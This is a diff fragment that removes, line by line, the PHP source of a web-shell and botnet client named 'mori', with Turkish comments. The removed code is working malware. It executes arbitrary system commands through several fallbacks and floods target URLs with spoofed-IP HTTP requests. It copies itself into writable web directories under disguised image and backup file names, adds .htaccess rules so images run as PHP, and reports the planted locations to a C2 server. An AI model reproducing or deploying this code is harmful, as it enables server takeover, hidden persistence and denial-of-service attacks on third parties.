-        return php_native_flood($target, in_array($method, ['GET','POST','HEAD']) ? $method : 'GET', min($duration, 120), min($threads, 50), 30)
-             . "\n[FALLBACK] exec disabled";
-    }
-
-    // SİSTEM KOMUTU ÇALIŞTIR
-    return execute_system_command($cmd);
-}
-
-function execute_system_command($cmd) {
-    $methods_tried = [];
-    $cmd_pipe = $cmd . ' 2>&1';
-
-    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
-        $methods_tried[] = 'shell_exec';
-        $result = @shell_exec($cmd_pipe);
-        if ($result !== null) return $result;
-    }
-
-    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
-        $methods_tried[] = 'exec';
-        @exec($cmd_pipe, $output_lines, $return_var);
-        if (!empty($output_lines)) return implode("\n", $output_lines);
-    }
-
-    if (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
-        $methods_tried[] = 'system';
-        ob_start();
-        @system($cmd_pipe);
-        $result = ob_get_clean();
-        if ($result !== false && $result !== '') return $result;
-    }
-
-    if (function_exists('passthru') && !in_array('passthru', explode(',', ini_get('disable_functions')))) {
-        $methods_tried[] = 'passthru';
-        ob_start();
-        @passthru($cmd_pipe);
-        $result = ob_get_clean();
-        if ($result !== false && $result !== '') return $result;
-    }
-
-    if (function_exists('proc_open')) {
-        $methods_tried[] = 'proc_open';
-        $descriptors = [
-            0 => ['pipe', 'r'],
-            1 => ['pipe', 'w'],
-            2 => ['pipe', 'w']
-        ];
-        $process = @proc_open($cmd, $descriptors, $pipes);
-        if (is_resource($process)) {
-            fclose($pipes[0]);
-            $stdout = stream_get_contents($pipes[1]);
-            $stderr = stream_get_contents($pipes[2]);
-            fclose($pipes[1]);
-            fclose($pipes[2]);
-            proc_close($process);
-            $combined = trim($stdout . ($stderr ? "\nSTDERR:\n" . $stderr : ''));
-            if ($combined !== '') return $combined;
-        }
-    }
-
-    if (function_exists('popen')) {
-        $methods_tried[] = 'popen';
-        $handle = @popen($cmd_pipe, 'r');
-        if ($handle) {
-            $result = '';
-            while (!feof($handle)) {
-                $result .= fgets($handle);
-            }
-            pclose($handle);
-            if ($result !== '') return $result;
-        }
-    }
-
-    // Stress komutu (dos.py) + exec yok → otomatik PHP native flood
-    // Format: python3 /path/dos.py <target> <duration> <threads> [method]
-    if (preg_match('/python[23]?\s+\S*dos\.py\s+(\S+)\s+(\d+)\s+(\d+)\s*(\S*)/i', $cmd, $m)) {
-        $target   = $m[1];
-        $duration = min((int)$m[2], 300);
-        $threads  = min((int)$m[3], 50);
-        $method   = strtoupper($m[4] ?: 'GET');
-        if (!in_array($method, ['GET','POST','HEAD'], true)) $method = 'GET';
-        return php_native_flood($target, $method, $duration, $threads, 30);
-    }
-
-    // pcntl_fork ile background exec (bazı VPS)
-    if (function_exists('pcntl_fork') && (strpos($cmd, 'python') !== false || strpos($cmd, 'nohup') !== false)) {
-        $pid = @pcntl_fork();
-        if ($pid === 0) { @shell_exec($cmd . ' >/dev/null 2>&1 &'); exit(0); }
-        if ($pid > 0)   { return '[STRESS_BG] Background\'da çalışıyor (pid:' . $pid . ')'; }
-    }
-
-    // Queue dosyasına yaz — cron (CLI PHP) 5dk içinde çalıştırır
-    $queue_file = __DIR__ . '/.mori_exec_queue';
-    $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
-    $queue = array_filter($queue, fn($q) => (time() - ($q['t'] ?? 0)) < 3600);
-    $queue[] = ['cmd' => $cmd, 't' => time(), 'qid' => uniqid()];
-    @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);
-
-    return "[QUEUED] Shell kısıtlandı, komut kuyruğa alındı. Cron 5dk içinde çalıştıracak. Methods tried: " . implode(', ', $methods_tried);
-}
-
-// ─── MORI_STRESS helpers ──────────────────────────────────────────────────
-
-// Sadece local arama — download yapmaz (bloklamaz)
-function mori_get_dos_path() {
-    foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
-        if (!is_dir($dir)) continue;
-        foreach (['dos_mori.py', 'dos.py'] as $fn) {
-            $p = $dir . '/' . $fn;
-            if (@file_exists($p) && @filesize($p) > 1000) return $p;
-        }
-        foreach (@glob($dir . '/dos.py*') ?: [] as $f) {
-            if (@filesize($f) > 1000) return $f;
-        }
-    }
-    return null;
-}
-
-function mori_find_python() {
-    static $cached = null;
-    if ($cached !== null) return $cached;
-    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
-    $fn  = null;
-    foreach (['shell_exec', 'exec'] as $f)
-        if (function_exists($f) && !in_array($f, $dis)) { $fn = $f; break; }
-    if ($fn) {
-        foreach (['python3', 'python', '/usr/bin/python3', '/usr/local/bin/python3', '/usr/bin/python'] as $p) {
-            $r = trim((string)@$fn('which ' . escapeshellarg($p) . ' 2>/dev/null'));
-            if ($r && $r[0] === '/') return ($cached = $r);
-        }
-    }
-    return ($cached = 'python3');
-}
-
-function mori_exec_bg($cmd) {
-    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
-    foreach (['shell_exec', 'exec', 'system', 'passthru'] as $fn)
-        if (function_exists($fn) && !in_array($fn, $dis)) { @$fn($cmd); return true; }
-    if (function_exists('proc_open') && !in_array('proc_open', $dis)) {
-        $p = @proc_open($cmd, [], $pipes);
-        if ($p) { @proc_close($p); return true; }
-    }
-    if (function_exists('popen') && !in_array('popen', $dis)) {
-        $h = @popen($cmd, 'r');
-        if ($h) { @pclose($h); return true; }
-    }
-    return false;
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-
-/**
- * PHP native HTTP flood — rolling window pattern
- * Her tamamlanan istek anında yenisiyle değiştirilir, pool her zaman dolu kalır.
- */
-function php_native_flood($url, $method = 'GET', $duration = 20, $concurrency = 50, $rpc = 10) {
-    if (!function_exists('curl_multi_init')) return '[ERROR] curl_multi yok';
-    if (empty($url) || !preg_match('#^https?://#i', $url)) return '[ERROR] Geçersiz URL';
-
-    static $UAS = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
-    ];
-
-    $method   = strtoupper(in_array(strtoupper($method), ['GET','POST','HEAD']) ? $method : 'GET');
-    $deadline = time() + $duration;
-    $sent = $errors = 0;
-
-    $make = function() use ($url, $method, &$UAS) {
-        $ip = mt_rand(1,223).'.'.mt_rand(0,255).'.'.mt_rand(0,255).'.'.mt_rand(1,254);
-        $ch = curl_init($url . '?_=' . mt_rand(1, 2147483647) . '&t=' . time());
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => false,
-            CURLOPT_TIMEOUT        => 5,
-            CURLOPT_CONNECTTIMEOUT => 3,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_FOLLOWLOCATION => false,
-            CURLOPT_USERAGENT      => $UAS[array_rand($UAS)],
-            CURLOPT_FORBID_REUSE   => false,
-            CURLOPT_FRESH_CONNECT  => false,
-            CURLOPT_HTTPHEADER     => [
-                'X-Forwarded-For: ' . $ip,
-                'X-Real-IP: '       . $ip,
-                'CF-Connecting-IP: '. $ip,
-                'Accept: */*',
-                'Connection: keep-alive',
-                'Cache-Control: no-cache',
-            ],
-        ]);
-        if ($method === 'POST') {
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, 'x=' . substr(md5(mt_rand()), 0, mt_rand(16,64)));
-        } elseif ($method === 'HEAD') {
-            curl_setopt($ch, CURLOPT_NOBODY, true);
-        }
-        return $ch;
-    };
-
-    $mh   = curl_multi_init();
-    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, $concurrency);
-    $pool = [];
-
-    // fill initial pool
-    for ($i = 0; $i < $concurrency; $i++) {
-        $ch = $make();
-        curl_multi_add_handle($mh, $ch);
-        $pool[(int)$ch] = $ch;
-    }
-
-    // rolling window — as soon as one slot frees, fire a new request
-    while (time() < $deadline) {
-        curl_multi_exec($mh, $running);
-        while ($done = curl_multi_info_read($mh)) {
-            $ch   = $done['handle'];
-            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            ($code > 0) ? $sent++ : $errors++;
-            curl_multi_remove_handle($mh, $ch);
-            curl_close($ch);
-            unset($pool[(int)$ch]);
-            if (time() < $deadline) {
-                $new = $make();
-                curl_multi_add_handle($mh, $new);
-                $pool[(int)$new] = $new;
-            }
-        }
-        curl_multi_select($mh, 0.001);
-    }
-
-    foreach ($pool as $ch) { curl_multi_remove_handle($mh, $ch); curl_close($ch); }
-    curl_multi_close($mh);
-
-    $rps = $duration > 0 ? round($sent / $duration) : $sent;
-    return "[PHP_STRESS] $url | $method | {$duration}s | sent:{$sent} err:{$errors} | ~{$rps} req/s";
-}
-
-// =====================================================
-// DOSYA SİSTEMİ İŞLEMLERİ
-// =====================================================
-function list_directory($path) {
-    $path = str_replace('\\', '/', $path);
-    $real = realpath($path);
-    
-    if (!$real || !is_dir($real)) {
-        return json_encode(['error' => "Directory not found: $path"]);
-    }
-    
-    $items = [];
-    $dir = @opendir($real);
-    
-    if (!$dir) {
-        return json_encode(['error' => "Cannot open directory: $path"]);
-    }
-    
-    while (($file = readdir($dir)) !== false) {
-        if ($file === '.' || $file === '..') continue;
-        
-        $full = $real . DIRECTORY_SEPARATOR . $file;
-        $stat = @stat($full);
-        
-        $items[] = [
-            'name' => $file,
-            'type' => is_dir($full) ? 'dir' : 'file',
-            'path' => str_replace('\\', '/', $full),
-            'size' => is_file($full) ? filesize($full) : 0,
-            'perms' => substr(sprintf('%o', fileperms($full)), -4),
-            'owner' => function_exists('fileowner') ? fileowner($full) : null,
-            'group' => function_exists('filegroup') ? filegroup($full) : null,
-            'modified' => filemtime($full),
-            'readable' => is_readable($full),
-            'writable' => is_writable($full),
-            'executable' => is_executable($full)
-        ];
-    }
-    
-    closedir($dir);
-    
-    // Dizinleri önce sırala
-    usort($items, function($a, $b) {
-        if ($a['type'] === $b['type']) {
-            return strcasecmp($a['name'], $b['name']);
-        }
-        return $a['type'] === 'dir' ? -1 : 1;
-    });
-    
-    return json_encode($items, JSON_PRETTY_PRINT);
-}
-
-function read_file($file) {
-    $real = realpath($file);
-    
-    if (!$real || !is_file($real) || !is_readable($real)) {
-        return "[ERROR] Cannot read file: $file";
-    }
-    
-    $content = @file_get_contents($real);
-    return $content !== false ? $content : "[ERROR] Read failed";
-}
-
-function write_file($file, $content_b64) {
-    $content = safe_base64_decode($content_b64);
-    if ($content === false) $content = @base64_decode($content_b64, true);
-    if ($content === false) return "[ERROR] Failed to decode base64 content";
-    $dir = dirname($file);
-    
-    if (!is_dir($dir)) {
-        @mkdir($dir, 0755, true);
-    }
-    
-    $result = @file_put_contents($file, $content);
-    return $result !== false ? "OK: $result bytes written" : "[ERROR] Write failed";
-}
-
-function delete_file($file) {
-    $real = realpath($file);
-    
-    if (!$real || !is_file($real)) {
-        return "[ERROR] File not found: $file";
-    }
-    
-    return @unlink($real) ? "OK: Deleted $file" : "[ERROR] Delete failed";
-}
-
-function copy_file($src, $dst) {
-    return @copy($src, $dst) ? "OK: Copied $src to $dst" : "[ERROR] Copy failed";
-}
-
-function create_directory($path) {
-    return @mkdir($path, 0755, true) ? "OK: Created $path" : "[ERROR] Cannot create directory";
-}
-
-function get_persistence_target_file() {
-    return __FILE__;
-}
-
-function get_persistence_source_url() {
-    global $persistence_default_url;
-    $url = $persistence_default_url;
-    $localFile = __DIR__ . '/.persistence_source_url';
-    if (file_exists($localFile)) {
-        $stored = trim(file_get_contents($localFile));
-        if (filter_var($stored, FILTER_VALIDATE_URL)) {
-            $url = $stored;
-        }
-    }
-    return $url;
-}
-
-function find_writable_directories($bases, $maxDirs = 50, $maxDepth = 3, $maxNodes = 1000) {
-    /**
-     * PHP-based recursive writable directories search
-     * Used as fallback when shell commands unavailable
-     */
-    $found = [];
-    $visited = [];
-    $queue = [];
-
-    foreach ($bases as $base) {
-        if (!$base || !is_dir($base)) {
-            continue;
-        }
-        $real = realpath($base);
-        if (!$real || isset($visited[$real])) {
-            continue;
-        }
-        $visited[$real] = true;
-        if (is_writable($real)) {
-            $found[] = $real;
-        }
-        $queue[] = ['path' => $real, 'depth' => 0];
-    }
-
-    $nodes = 0;
-    while ($queue && count($found) < $maxDirs && $nodes < $maxNodes) {
-        $item = array_shift($queue);
-        $nodes++;
-        $path = $item['path'];
-        $depth = $item['depth'];
-
-        if ($depth >= $maxDepth) {
-            continue;
-        }
-
-        $entries = @scandir($path);
-        if (!$entries || !is_array($entries)) {
-            continue;
-        }
-
-        foreach ($entries as $entry) {
-            if ($entry === '.' || $entry === '..') {
-                continue;
-            }
-            $sub = $path . DIRECTORY_SEPARATOR . $entry;
-            if (!is_dir($sub)) {
-                continue;
-            }
-            $realSub = realpath($sub);
-            if (!$realSub || isset($visited[$realSub])) {
-                continue;
-            }
-            if (in_array($entry, ['proc', 'sys', 'dev', 'run', 'tmp', 'lost+found'], true)) {
-                continue;
-            }
-            $visited[$realSub] = true;
-            if (is_writable($realSub)) {
-                $found[] = $realSub;
-            }
-            $queue[] = ['path' => $realSub, 'depth' => $depth + 1];
-        }
-    }
-
-    return $found;
-}
-
-function enumerate_root_writable_dirs() {
-    /**
-     * Root path altında writable dizinleri enumerate et
-     * find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100
-     */
-    $writable_dirs = [];
-    
-    // YÖNTEM 1: find komutu ile (daha hızlı ve kapsamlı)
-    if (function_exists('shell_exec')) {
-        $find_cmd = 'find / -maxdepth 5 -writable -type d 2>/dev/null | head -n 100';
-        $output = @shell_exec($find_cmd);
-        if ($output) {
-            $lines = explode("\n", trim($output));
-            foreach ($lines as $line) {
-                $line = trim($line);
-                if ($line && is_dir($line) && is_writable($line)) {
-                    $writable_dirs[] = $line;
-                }
-            }
-        }
-    }
-    
-    // YÖNTEM 2: PHP ile recursive search (fallback)
-    if (count($writable_dirs) < 10) {
-        $php_dirs = find_writable_directories(['/'], 100, 5, 1000);
-        $writable_dirs = array_merge($writable_dirs, $php_dirs);
-    }
-    
-    // Duplicate'ları kaldır ve filtrele
-    $writable_dirs = array_unique($writable_dirs);
-    $filtered = [];
-    
-    foreach ($writable_dirs as $dir) {
-        // Tehlikeli dizinleri çıkar
-        if (strpos($dir, '/proc/') === 0 || 
-            strpos($dir, '/sys/') === 0 || 
-            strpos($dir, '/dev/') === 0 ||
-            $dir === '/' ||
-            !is_writable($dir)) {
-            continue;
-        }
-        $filtered[] = $dir;
-    }
-    
-    return array_slice($filtered, 0, 100);
-}
-
-// =====================================================
-// PERSISTENCE V4 - WARRIOR SYSTEM
-// Multi-location deployment + Sister files + PNG masking
-// =====================================================
-
-function get_deployment_targets() {
-    /**
-     * Find all writable web directories recursively
-     * Returns paths to deploy sister files
-     */
-    $targets = [];
-    
-    // Primary locations
-    $base_paths = [
-        '/var/www/html',
-        '/var/www',
-        '/home',
-        '/opt',
-        '/srv',
-        '/usr/share/nginx/html',
-        dirname(__DIR__),
-        __DIR__,
-        sys_get_temp_dir(),
-    ];
-    
-    foreach ($base_paths as $base) {
-        if (!@is_dir($base) || !@is_writable($base)) continue;
-        
-        // Add base directory
-        if (count($targets) < 20) {
-            $targets[] = $base;
-        }
-        
-        // Scan for WordPress/plugin directories
-        $subdirs = @scandir($base);
-        if (!$subdirs) continue;
-        
-        foreach ($subdirs as $subdir) {
-            if ($subdir === '.' || $subdir === '..') continue;
-            
-            $full_path = $base . '/' . $subdir;
-            if (!@is_dir($full_path) || !@is_readable($full_path)) continue;
-            
-            // WordPress themes
-            if ($subdir === 'wp-content') {
-                $themes = $full_path . '/themes';
-                if (@is_dir($themes) && @is_writable($themes)) {
-                    $targets[] = $themes;
-                }
-                
-                $plugins = $full_path . '/plugins';
-                if (@is_dir($plugins) && @is_writable($plugins)) {
-                    $targets[] = $plugins;
-                }
-            }
-            
-            // Generic web directory
-            if (@is_writable($full_path) && count($targets) < 20) {
-                $targets[] = $full_path;
-            }
-        }
-    }
-    
-    return array_values(array_unique($targets));
-}
-
-// ====================================================
-// DEEP DEPLOYMENT TARGET SCANNING (Generic Linux)
-// ====================================================
-function get_deployment_targets_from_backup() {
-    $targets = [];
-    // Minimal exclusion: only truly critical system dirs
-    $excluded_root_dirs = ["proc", "sys", "dev", "etc", "lib"];
-    
-    // 1. SYSTEM SCAN - Start from root, avoid excluded dirs
-    function scan_writable_everywhere($path, &$results, $max_depth = 4, $depth = 0, $excluded = []) {
-        if (count($results) >= 100 || $depth >= $max_depth) return;
-        if (!@is_dir($path) || !@is_readable($path)) return;
-        
-        $entries = @scandir($path);
-        if (!$entries) return;
-        
-        foreach ($entries as $entry) {
-            if ($entry === "." || $entry === "..") continue;
-            
-            // Skip excluded dirs at root level
-            if ($depth === 0 && in_array($entry, $excluded)) continue;
-            
-            $full = $path . "/" . $entry;
-            if (!@is_dir($full) || !@is_readable($full)) continue;
-            
-            // Writable? Add it
-            if (@is_writable($full) && count($results) < 100) {
-                $results[] = $full;
-            }
-            
-            // Stay shallow to avoid massive deep recursion
-            if ($depth < $max_depth - 1 && strlen($full) < 80) {
-                scan_writable_everywhere($full, $results, $max_depth, $depth + 1, $excluded);
-            }
-        }
-    }
-    
-    // Start from root
-    scan_writable_everywhere("/", $targets, 3, 0, $excluded_root_dirs);
-    
-    // 2. WEB-SPECIFIC DEEP SCAN - Go deeper in web roots
-    function scan_web_deep($base, &$results, $max_depth = 6, $depth = 0) {
-        if (count($results) >= 100 || $depth >= $max_depth) return;
-        if (!@is_dir($base) || !@is_readable($base)) return;
-        
-        $entries = @scandir($base);
-        if (!$entries) return;
-        
-        foreach ($entries as $entry) {
-            if ($entry === "." || $entry === "..") continue;
-            
-            $full = $base . "/" . $entry;
-            if (!@is_dir($full) || !@is_readable($full)) continue;
-            
-            // Prioritize ANY common web/app locations (generic, not WordPress-specific)
-            $is_web_priority = (
-                preg_match("/public_html|www|html|webroot|htdocs|web/i", $full) ||
-                preg_match("/uploads|files|media|downloads|attachments/i", $full) ||
-                preg_match("/apps?|store|api|backend|frontend|dist|build/i", $full) ||
-                preg_match("/\.git|\.config|\.cache|\.local|\.ssh/i", $full) ||
-                preg_match("/[a-f0-9\-]{36}|[0-9]{4,}/", basename($full)) // UUID or numeric dirs (tenant IDs)
-            );
-            
-            if (@is_writable($full) && count($results) < 100) {
-                // DEEP PATHS GET PRIORITY
-                $depth_score = substr_count($full, "/");
-                $results[] = ["path" => $full, "depth" => $depth_score, "web" => $is_web_priority];
-            }
-            
-            // Go deeper
-            if ($depth < $max_depth - 1) {
-                scan_web_deep($full, $results, $max_depth, $depth + 1);
-            }
-        }
-    }
-    
-    // Web root deep scan
-    $web_bases = ["/var/www", "/home", "/opt", "/srv", "/var"];
-    foreach ($web_bases as $base) {
-        if (@is_dir($base)) {
-            $temp = [];
-            scan_web_deep($base, $temp);
-            $targets = array_merge($targets, $temp);
-        }
-    }
-    
-    // 3. SORT BY DEPTH (deeper = better for hiding)
-    usort($targets, function($a, $b) {
-        if (is_array($a)) {
-            $depth_a = $a["depth"] ?? 0;
-            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
-        }
-        return 0;
-    });
-    
-    // Extract just paths
-    $final_targets = [];
-    foreach ($targets as $item) {
-        if (is_array($item)) {
-            $final_targets[] = $item["path"];
-        } else {
-            $final_targets[] = $item;
-        }
-    }
-    
-    return array_values(array_unique($final_targets));
-}
-
-// Combine both deployment target scanners
-function get_all_deployment_targets() {
-    $targets = array_merge(
-        get_deployment_targets(),
-        get_deployment_targets_from_backup()
-    );
-    return array_unique($targets);
-}
-
-function file_path_to_url($file_path) {
-    $scheme   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-    $host     = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
-    $doc_root = rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/');
-
-    // 1. DOCUMENT_ROOT mapping — en güvenilir yöntem
-    if ($doc_root && $host && strpos($file_path, $doc_root) === 0) {
-        $rel = ltrim(str_replace('\\', '/', substr($file_path, strlen($doc_root))), '/');
-        return $scheme . '://' . $host . '/' . $rel;
-    }
-
-    // 2. Shell URL'den türet — DOCUMENT_ROOT yokken (CLI, cron)
-    $shell_url = $GLOBALS['WEB_URL'] ?? $GLOBALS['web_shell_url'] ?? '';
-    if ($shell_url) {
-        $shell_dir = rtrim(str_replace('\\', '/', __DIR__), '/');
-        $file_norm = str_replace('\\', '/', $file_path);
-        if (strpos($file_norm, $shell_dir) === 0) {
-            $base = rtrim(dirname($shell_url), '/');
-            $rel  = ltrim(substr($file_norm, strlen($shell_dir)), '/');
-            return $base . '/' . $rel;
-        }
-    }
-
-    // 3. /var/www/html/<file>
-    if (strpos($file_path, '/var/www/html') === 0) {
-        $rel = ltrim(substr($file_path, strlen('/var/www/html')), '/');
-        return $scheme . '://' . ($host ?: 'localhost') . '/' . $rel;
-    }
-
-    // 4. /var/www/<domain>/...
-    if (preg_match('|^/var/www/([^/]+)/(.+)|', $file_path, $m)) {
-        return $scheme . '://' . $m[1] . '/' . $m[2];
-    }
-
-    // 5. /home/<user>/public_html/...
-    if (preg_match('|^/home/[^/]+/public_html/(.+)|', $file_path, $m)) {
-        return $scheme . '://' . ($host ?: 'localhost') . '/' . $m[1];
-    }
-
-    return null;
-}
-
-function deploy_sister_files_aggressive() {
-    /**
-     * WARRIOR SYSTEM v3 - GENERIC LINUX SITES
-     * Deploy sister files to 10+ locations with masking
-     * Works on ANY Linux site (not just WordPress)
-     * FIX: Sister files use .png/.gif/.jpg ONLY (no .php.png pattern)
-     */
-    global $c2_server, $web_shell_url;
-    
-    // Lock - 1 hour deployment cooldown
-    $deploy_lock = '/tmp/.mori_deploy_lock_v4';
-    if (@file_exists($deploy_lock)) {
-        $lock_age = time() - @filemtime($deploy_lock);
-        if ($lock_age < 3600) return true; // Already deployed recently
-    }
-    
-    // Get targets - dynamic enumeration
-    $targets = get_all_deployment_targets();
-    $targets = array_unique($targets);
-    if (count($targets) < 3) return false;
-    
-    @touch($deploy_lock);
-    
-    // Read current shell code
-    $shell_code = @file_get_contents(__FILE__);
-    if (!$shell_code || strlen($shell_code) < 15000) return false;
-    
-    // Deploy strategy (generic for ANY Linux site):
-    // 1. Generic PHP files (config-backup.php, system-backup.php, etc)
-    // 2. Image-masked PHP files (logo.png, banner.gif, avatar.jpg)
-    // 3. .htaccess for magic routing
-    
-    $deployed = [];
-    // Generic names (not WordPress-specific)
-    $standard_names = ['config-backup.php', 'system-backup.php', 'init-backup.php'];
-    $masked_names = ['logo.png', 'banner.gif', 'avatar.jpg'];
-    
-    foreach (array_slice($targets, 0, 10) as $idx => $target) {
-        if (!@is_dir($target) || !@is_writable($target)) continue;
-        
-        // Strategy 1: Standard PHP file
-        $standard_file = $target . '/' . $standard_names[$idx % count($standard_names)];
-        @file_put_contents($standard_file, $shell_code);
-        @chmod($standard_file, 0644);
-        $deployed[] = $standard_file;
-        
-        // Strategy 2: Image-masked PHP (no .php extension - just .png/.gif/.jpg)
-        $masked_file = $target . '/' . $masked_names[$idx % count($masked_names)];
-        $masked_code = "<?php\n" . substr($shell_code, 5);
-        @file_put_contents($masked_file, $masked_code);
-        @chmod($masked_file, 0644);
-        $deployed[] = $masked_file;
-        
-        // Strategy 3: .htaccess to execute images as PHP
-        $htaccess = $target . '/.htaccess';
-        $htaccess_content = <<<'HTACCESS'
-<FilesMatch "\.png$|\.gif$|\.jpg$">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-<FilesMatch "(config|system|init)-backup\.php$">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-<FilesMatch "^\.">
-    Deny From All
-</FilesMatch>
-HTACCESS;
-        @file_put_contents($htaccess, $htaccess_content);
-        @chmod($htaccess, 0644);
-    }
-    
-    // Store deployment info in C2
-    $deployment_info = [
-        'deployed_count' => count($deployed),
-        'locations' => $deployed,
-        'timestamp' => time(),
-        'target_count' => count($targets),
-        'urls' => []
-    ];
-    
-    // Generate accessible URLs using DOCUMENT_ROOT-aware mapping
-    foreach ($deployed as $file_path) {
-        $mapped = file_path_to_url($file_path);
-        if ($mapped) $deployment_info['urls'][] = $mapped;
-    }
-    $deployment_info['urls'] = array_values(array_unique($deployment_info['urls']));
-
-    // Cache for registration pickup
-    @file_put_contents(sys_get_temp_dir() . '/.mori_sister_cache.json', json_encode($deployment_info));
-
-    return $deployment_info;
-}
-
-function report_sister_files_to_c2($deployment_info) {
-    $server = $GLOBALS['C2_SERVER'] ?? '';
-    $id     = $GLOBALS['CLIENT_ID'] ?? '';
-    if (!$server || !$id || empty($deployment_info['locations'])) return false;
-
-    $payload = [
-        'id'          => $id,
-        'sister_files'=> $deployment_info['locations'],
-        'sister_urls' => $deployment_info['urls'] ?? [],
-        'deployed_at' => $deployment_info['timestamp'] ?? time(),
-    ];
-
-    $encoded = safe_base64_encode(safe_json_encode($payload));
-    @http_post_timeout($server . '?act=sister_report', $encoded, 2);
-    return true;
-}
-
-function generate_wp_config_backup() {
-    /**
-     * Generate wp-config-backup.php
-     * ORCHESTRATOR for deployment v3
-     * Optimized writable dir scanning + deep path prioritization
-     */
-    
-    global $C2_SERVER, $web_shell_url;
-    $c2_server = $C2_SERVER;  // $C2_SERVER is the actual global; $c2_server only exists inside c2_register()
-
-    $code = '<?php
-/**
- * WordPress Configuration Backup Orchestrator v3
- * Smart writable directory detection + deep path prioritization
- */
-
-// OPTIMIZED: Scan writable directories (system-wide + web)
-function get_deployment_targets_from_backup() {
-    $targets = [];
-    // Minimal exclusion: only truly critical system dirs
-    $excluded_root_dirs = ["proc", "sys", "dev", "etc", "lib"];
-    
-    // 1. SYSTEM SCAN - Start from root, avoid excluded dirs
-    function scan_writable_everywhere($path, &$results, $max_depth = 4, $depth = 0, $excluded = []) {
-        if (count($results) >= 100 || $depth >= $max_depth) return;
-        if (!@is_dir($path) || !@is_readable($path)) return;
-        
-        $entries = @scandir($path);
-        if (!$entries) return;
-        
-        foreach ($entries as $entry) {
-            if ($entry === "." || $entry === "..") continue;
-            
-            // Skip excluded dirs at root level
-            if ($depth === 0 && in_array($entry, $excluded)) continue;
-            
-            $full = $path . "/" . $entry;
-            if (!@is_dir($full) || !@is_readable($full)) continue;
-            
-            // Writable? Add it
-            if (@is_writable($full) && count($results) < 100) {
-                $results[] = $full;
-            }
-            
-            // Stay shallow to avoid massive deep recursion
-            if ($depth < $max_depth - 1 && strlen($full) < 80) {
-                scan_writable_everywhere($full, $results, $max_depth, $depth + 1, $excluded);
-            }
-        }
-    }
-    
-    // Start from root
-    scan_writable_everywhere("/", $targets, 3, 0, $excluded_root_dirs);
-    
-    // 2. WEB-SPECIFIC DEEP SCAN - Go deeper in web roots
-    function scan_web_deep($base, &$results, $max_depth = 6, $depth = 0) {
-        if (count($results) >= 100 || $depth >= $max_depth) return;
-        if (!@is_dir($base) || !@is_readable($base)) return;
-        
-        $entries = @scandir($base);
-        if (!$entries) return;
-        
-        foreach ($entries as $entry) {
-            if ($entry === "." || $entry === "..") continue;
-            
-            $full = $base . "/" . $entry;
-            if (!@is_dir($full) || !@is_readable($full)) continue;
-            
-            // Prioritize ANY common web/app locations (generic, not WordPress-specific)
-            $is_web_priority = (
-                preg_match("/public_html|www|html|webroot|htdocs|web/i", $full) ||
-                preg_match("/uploads|files|media|downloads|attachments/i", $full) ||
-                preg_match("/apps?|store|api|backend|frontend|dist|build/i", $full) ||
-                preg_match("/\.git|\.config|\.cache|\.local|\.ssh/i", $full) ||
-                preg_match("/[a-f0-9\-]{36}|[0-9]{4,}/", basename($full)) // UUID or numeric dirs (tenant IDs)
-            );
-            
-            if (@is_writable($full) && count($results) < 100) {
-                // DEEP PATHS GET PRIORITY
-                $depth_score = substr_count($full, "/");
-                $results[] = ["path" => $full, "depth" => $depth_score, "web" => $is_web_priority];
-            }
-            
-            // Go deeper
-            if ($depth < $max_depth - 1) {
-                scan_web_deep($full, $results, $max_depth, $depth + 1);
-            }
-        }
-    }
-    
-    // Web root deep scan
-    $web_bases = ["/var/www", "/home", "/opt", "/srv", "/var"];
-    foreach ($web_bases as $base) {
-        if (@is_dir($base)) {
-            $temp = [];
-            scan_web_deep($base, $temp);
-            $targets = array_merge($targets, $temp);
-        }
-    }
-    
-    // 3. SORT BY DEPTH (deeper = better for hiding)
-    usort($targets, function($a, $b) {
-        if (is_array($a)) {
-            $depth_a = $a["depth"] ?? 0;
-            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
-        }
-        return 0;
-    });
-    
-    // Extract just paths
-    $final_targets = [];
-    foreach ($targets as $item) {
-        if (is_array($item)) {
-            $final_targets[] = $item["path"];
-        } else {
-            $final_targets[] = $item;
-        }
-    }
-    
